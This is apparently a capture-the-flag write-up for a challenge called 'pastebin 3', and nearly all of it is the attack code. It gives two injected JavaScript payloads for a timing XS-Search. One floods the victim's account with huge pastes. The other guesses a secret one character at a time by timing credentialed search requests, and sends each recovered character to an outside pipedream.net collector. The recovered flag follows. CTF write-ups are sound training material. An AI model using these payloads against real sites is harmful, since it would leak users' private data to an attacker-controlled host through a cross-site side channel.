# pastebin 3

I solved with timing XS-Search, you can make the search take a long time with enough data - apparently unintentional.

I used 2 payloads, 1 to add a lot of data to the paste and another to actually search.

```
`);
const rounds = 1;
const chars = `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$%()*+,-./:;=?@[\\]^{|}~`;
const endpoint = `https://pastebin-3.mc.ax/search?query=`;
const known = `flag`;

let stats = Array.from(Array(chars.length), function(){return Array()});
async function go() {
    await fetch(`https://pastebin-3.mc.ax/create_paste`, {method:`POST`,mode:`no-cors`,credentials:`include`,headers:{[`Content-Type`]:`application/x-www-form-urlencoded`},body:`paste=xssearchloadingthing`+`x`.repeat(10*1024*1024)}).catch(function(){});await fetch(`https://pastebin-3.mc.ax/create_paste`, {method:`POST`,mode:`no-cors`,credentials:`include`,headers:{[`Content-Type`]:`application/x-www-form-urlencoded`},body:`paste=xssearchloadingthing`+`x`.repeat(10*1024*1024)}).catch(function(){});await fetch(`https://pastebin-3.mc.ax/create_paste`, {method:`POST`,mode:`no-cors`,credentials:`include`,headers:{[`Content-Type`]:`application/x-www-form-urlencoded`},body:`paste=xssearchloadingthing`+`x`.repeat(10*1024*1024)}).catch(function(){});
    fetch(`https://enax6gofw7ee.x.pipedream.net/done`);
}
go();
(`a
```
```
`);const rounds = 1;const chars = `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}^|_!$%()*+,-./:;=?@`;const endpoint = `https://pastebin-3.mc.ax/search?query=`;let known = `flag{c00k13_b0mb1n6_15_f4k3_vu`;window.done=0;async function go() {    for(const r of [...Array(rounds).keys()]) {        for(const i of [...Array(chars.length).keys()]) {            let start = performance.now();            await fetch(endpoint + known + chars[i], {mode:`no-cors`,credentials:`include`}).catch(function(error){x=(performance.now() - start);if(~~(x/200))return;known+=chars[i];fetch(`https://enw4lbuyk30em.x.pipedream.net/`, {method:`POST`,body:`${x}.${known}`});window.done=1;});if(window.done){if(known.charAt(known.length-1)!=`}`){window.done=0;go();}return;}        }    }}go();(`a

```

flag: `flag{c00k13_b0mb1n6_15_f4k3_vuln}`
